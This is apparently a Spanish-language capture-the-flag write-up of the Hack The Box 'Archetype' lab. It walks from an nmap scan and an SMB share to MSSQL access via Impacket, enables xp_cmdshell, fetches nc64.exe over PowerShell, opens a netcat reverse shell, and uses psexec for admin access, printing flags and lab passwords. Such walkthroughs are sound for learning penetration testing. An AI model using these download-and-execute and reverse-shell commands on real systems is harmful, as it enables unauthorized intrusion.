---
title: Máquina Archetype
published: true
---

Jorge Marco Arráez

## [](#header-3) 1)  Which TCP port is hosting a database server?

sudo nmap -sS --min-rate 5000 -p- -n -Pn $IP
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 18:25 UTC
    Nmap scan report for 10.129.76.19
    Host is up (0.046s latency).
    Not shown: 65529 filtered tcp ports (no-response)
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    49664/tcp open  unknown
    49665/tcp open  unknown
    49669/tcp open  unknown

este escaneo no me ha dado un puerto de cuatro dígitos, que es lo que me pide HTB, asi que llevo otro a cabo 

```
sudo nmap -sCV --min-rate 5000 -p- -n -Pn $IP
sudo nmap -sCV --min-rate 5000 -A -vvv -Pn -n -p 1433,139,445 -oN mainports $IP
```

1433/tcp open  ms-sql-s     syn-ack ttl 128 Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-04-15T14:07:35
| Not valid after:  2052-04-15T14:07:35
| MD5:   01b1 a439 ed24 1acd b23c 0a93 5f56 d65d
| SHA-1: ef69 46fa 4758 c842 b313 2728 1f41 4aa6 73f0 a0e5
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQGzLxzutu+6dLyMwyyeSkLTANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjIwNDE1MTQwNzM1WhgPMjA1MjA0MTUxNDA3MzVaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANDjzKgx
| GKa5btbf7BR8mb/CfGwzyQRatfk7voA+KYjsB4Nc/VOu1LGIkLwLqJhFnP0tzZR2
| gW2NWRSvmhDwuwuOkm6RoiW0B60C4jljS1cctF3RklJz48Rk891rDW+R+3/fOarQ
| gsDQSYQEs4H3akGraIc8DUbFotmFaxpMFa2OjnL5kzh/CXbWlCbALFn6ST5QwhLC
| RHDJZkytuVCYrJhnmb+R6HQssCxKOdO0jIhIyjUinDjyBjnolrLmJt3XbeCYvWiu
| Bw10ZuIzPeKGExnA+7rcRyeSTdo0uMAQN/lvVHrrrI2OFVLfZ4nlqIsF7zagI7Iy
| zsBtCRE5Ib2awpECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAnXov6WHCrwyk8HFK
| uHpFRQDlTLxves6xgZTMjUvuqn+LoCJXz/pYq5N/pgefmjSqPOdR2l4J1ezHaQxI
| BzGqtKQSgqqye9WjxAMNgcl1XZSPZdw0G9DIjnRnpwo2ME41FuVO0anGJ0CzLKL5
| XxH4s48k1G4OxyZ9TaTLu2Q/XOkpYnUhSZmJvooT0rj9DBABOokYRzhCAVrSWmYp
| 2vJvOopeDfSmAqDjS23dGPbVB8ClvtIn/rf0Uuv/sLB2HDIKJw5490ka72FdXoRq
| tQSlHLefup52BFZvZDYFbQcGayAI2+KdH7Na3vE5yDv0QSshiIgaqjWsDsqwPG2+
| WDvpoA==
|_-----END CERTIFICATE-----
|_ssl-date: 2022-04-15T14:17:15+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows XP|7|2012
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012
OS details: Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/15%OT=139%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=62597E6B%P=x
OS:86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=107%TI=I%II=I%SS=S%TS=U)OPS(O1=M5
OS:B4%O2=M5B4%O3=M5B4%O4=M5B4%O5=M5B4%O6=M5B4)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W
OS:4=FAF0%W5=FAF0%W6=FAF0)ECN(R=Y%DF=N%TG=80%W=FAF0%O=M5B4%CC=N%Q=)T1(R=Y%D
OS:F=N%TG=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=N%TG=80%W=FAF0%S=O%A=S+
OS:%F=AS%O=M5B4%RD=0%Q=)T4(R=Y%DF=N%TG=80%W=7FFF%S=A%A=Z%F=R%O=%RD=0%Q=)T6(
OS:R=Y%DF=N%TG=80%W=7FFF%S=A%A=Z%F=R%O=%RD=0%Q=)U1(R=N)IE(R=Y%DFI=N%TG=80%C
OS:D=Z)

no sé si puedo usar el certificado para algo, diría que no, que únicamente sirve para autenticar el servicio.


el puerto que buscamos es el 1433

## [](#header-3) 2) What is the name of the non-Administrative share available over SMB?

smbclient -L $IP
root

Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC


backups

## [](#header-3) 3)  What is the password identified in the file on the SMB share?

smbclient \\\\$IP\\backups
ls
get prod.dtsConfig
M3g4c0rp123

## [](#header-3) 4)  What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

https://github.com/SecureAuthCorp/impacket/tree/master/examples

En la carpeta examples está el código que necesitamos

mssqlclient.py

## [](#header-3) 5)  What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

xp_cmdshell

## [](#header-3) 6)  What script can be used in order to search possible paths to escalate privileges on Windows hosts?

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

winpeas

## [](#header-3) 7)  What file contains the administrator's password?

python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth


tengo las siguientes herramientas:
	-> winpeas
	-> mssqlclient.py
	-> xp_cmdshell

cuando uso el programa de mssqlclient y me autentico con la contraseña que hemos conseguido antes,
entro a una base de datos que usa mssql. ahora la dificultad está en saber manejarse por una mssql.

listo las bases de datos que hay:

```
SELECT name FROM master.sys.databases 
```

master
tempdb
model
msdb

pruebo con msdb

(https://chartio.com/resources/tutorials/sql-server-list-tables-how-to-show-all-tables/)
(https://stackoverflow.com/questions/147659/get-list-of-databases-from-sql-server)

USE msdb
SELECT * FROM SYSOBJECTS WHERE xtype = 'U';
SELECT name FROM SYSOBJECTS WHERE xtype = 'U';

SELECT * FROM INFORMATION_SCHEMA.TABLES;

Las tablas que tiene la base de datos master son:
1) spt_fallback_db
2) spt_fallback_dev
3) spt_fallback_usg
4) spt_values
5) spt_monitor
6) MS_replication_options 

SELECT * FROM TableName

TABLAS 1, 2, 3: están vacias

La tabla 4 tiene muchísimas columnas, las más llamativas son: DB Owners, DB Access Administrators, DB Security Administrators, DB DDL Administrators  
WINDOWS/NT, WINDOWS LOGIN, CERTIFICATE, SQL USER, WINDOWS USER, LOGIN, WINDOWS LOGIN,

TABLA 5: parece vacía

TABLA 6: tiene 3 columnas, transactional, merge, security_model, pero al hacer SELECT merge FROM MSreplication_options no me deja sacar información

Leyendo hacktricks he visto que se puede habilitar el xp_cmdshell, asi que:

```
sp_configure 'show advanced options', '1'
RECONFIGURE

sp_configure 'xp_cmdshell', '1'
RECONFIGURE

EXEC master..xp_cmdshell 'whoami'
-> archetype\sql_svc
```

A partir de ahora tengo que mirar el walkthrough

El objetivo es establecer una reverse shell. Descargaremos nc64.exe y en esa carpeta, ejecutaremos el siguiente comando: 

```
sudo python3 -m http.server 80
```
Así abrimos el puerto 80 para poder conectarnos a nuestro ordenador desde la consola de la maquina que esta hosteando la base de datos

Usaremos netcat para escuchar por el puerto 443:

```
sudo nc -lvnp 443
```

Mi direccion ip es esta 10.10.14.110

Así que si desde la ventana de sql hacemos:

```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.110/nc64.exe -outfile nc64.exe"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.110 443"
```

## [](#header-3) 8)  Submit user flag

```
cd C:\Users\sql_svc\Desktop
dir
type user.txt
```

```
3e7b102e78218e935bf3f4951fec21a3
```

```
powershell
wget http://10.10.14.110/winPEASx64.exe -outfile winPEASx64.exe
./winPEASx64.exe
cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
text ConsoleHost_history.txt
```
Con esto obtenemos la contraseña de administrator que es: "MEGACORP_4dm1n!!"


## [](#header-3) 9) Submit root flag

Ahora, con psexec.py y la contraseña que hemos hallado antes:

```
python3 psexec.py administrator@$IP
cd C:\Users\Administrator\Desktop
dir
type root.txt
```
```
b91ccec3305e98240082d4474b848528
```
